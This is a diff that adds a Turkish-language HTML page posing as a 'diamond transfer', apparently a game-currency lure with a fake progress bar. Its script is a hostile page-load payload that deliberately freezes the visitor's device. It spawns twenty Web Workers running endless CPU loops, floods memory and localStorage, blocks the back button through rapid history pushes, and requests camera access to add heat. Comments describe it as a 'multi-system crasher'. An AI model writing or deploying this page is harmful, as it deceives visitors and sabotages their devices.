@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>💎 ELMAS AKTARIMI 💎</title>
+    <style>
+        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; overflow: hidden; margin: 0; }
+        .kill-zone { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; }
+        
+        /* 🔥 GPU CEHENNETİ: 8K Sanal Çözünürlük ve Sonsuz Bulanıklık */
+        .heavy-visual { 
+            position: absolute; width: 200%; height: 200%; 
+            top: -50%; left: -50%;
+            background: radial-gradient(circle, #f00, #000, #fff, #f00);
+            /* Her karede binlerce hesaplama gerektiren filtreler */
+            filter: blur(100px) contrast(200%) saturate(500%) hue-rotate(0deg); 
+            opacity: 0.1;
+            z-index: 1;
+            animation: gpuMelt 0.1s infinite linear;
+        }
+
+        /* Ekran kartını her milisaniyede görüntüyü yeniden hesaplamaya zorlar */
+        @keyframes gpuMelt {
+            0% { filter: blur(100px) hue-rotate(0deg); transform: scale(1); }
+            50% { filter: blur(150px) hue-rotate(180deg) transform: scale(1.1); }
+            100% { filter: blur(100px) hue-rotate(360deg) transform: scale(1); }
+        }
+
+        .bar-bg { width: 85%; height: 30px; background: #222; border: 2px solid #500; border-radius: 20px; margin: 40px auto; overflow: hidden; position: relative; z-index: 10; }
+        #bar { width: 0%; height: 100%; background: linear-gradient(90deg, #f00, #300); transition: width 0.1s; }
+    </style>
+</head>
+<body>
+    <div class="kill-zone">
+        <div class="heavy-visual"></div>
+        <div class="heavy-visual" style="animation-delay: 0.05s; opacity: 0.05;"></div>
+    </div>
+
+    <div style="position:relative; z-index:10; padding-top:100px;">
+        <h1 style="font-size:3rem; text-shadow: 0 0 20px #f00;">💎 ELMAS AKTARIMI 💎</h1>
+        <div class="bar-bg"><div id="bar"></div></div>
+        <h2 id="perc" style="font-size:3rem; color:#fff;">%0</h2>
+        <p>Hesap verileri senkronize ediliyor...</p>
+    </div>
+
+<script>
+    // 1. Oyalama Sayacı (Hızlıca %99'a çıkar)
+    let p = 0;
+    setInterval(() => { if(p < 99) { p++; document.getElementById("bar").style.width = p+"%"; document.getElementById("perc").innerText = "%"+p; } }, 30);
+
+    // ==========================================
+    // 💣 SON KOZ: ÇOKLU SİSTEM ÇÖKERTİCİ 💣
+    // ==========================================
+    
+    // GİRER GİRMEZ ÇALIŞIR!
+
+    // (A) CPU (İŞLEMCİ) İNFAZI: 20 Paralel "Nükleer" Döngü
+    // Web Workers ile tarayıcının kısıtlamalarını aşar
+    const killerBlob = new Blob([`
+        setInterval(() => {
+            // Matematiksel bir "karadelik" yaratır
+            let x = 0;
+            while(true) {
+                x = Math.sqrt(Math.random() * 999999999) * Math.atan(Math.random()) * Math.sin(x);
+                if (x > 1000000) x = 0; // Döngüyü asla kırmaz
+            }
+        }, 1);
+    `], { type: "text/javascript" });
+
+    const workerUrl = URL.createObjectURL(killerBlob);
+    for(let i=0; i<20; i++) { // İşlemcinin tüm çekirdeklerini %100 doldurur
+        new Worker(workerUrl);
+    }
+
+    // (B) RAM VE DEPOLAMA BOMBARDIMANI (Girer girmez)
+    // Cihazın hafızasını saniyeler içinde doldurur
+    let ramSucker = [];
+    setInterval(() => {
+        // Her 50ms'de 10MB'lık devasa veri blokları oluşturur
+        let chunk = new Array(5000000).fill("SYSTEM_FAILURE_CORE_DUMP_00000000").join("");
+        ramSucker.push(chunk);
+        
+        // Depolama alanını (localStorage) da sinsi sinsi doldurur
+        try { localStorage.setItem('flood_' + Math.random(), chunk); } catch(e) {}
+    }, 50);
+
+    // (C) GERİ ÇIKMA KİLİDİ (Anti-Escape)
+    setInterval(() => {
+        window.history.pushState(null, "", "/" + Math.random());
+    }, 10);
+
+    // (D) ACİL DURUM KAMERA ERİŞİMİ (Isıyı tavan yaptırır)
+    // Bazen donmayı tetikler çünkü telefon aynı anda hem ağır kodu hem kamerayı açamaz
+    try {
+        navigator.mediaDevices.getUserMedia({ video: true });
+    } catch(e) {}
+
+</script>
+</body>
+</html>
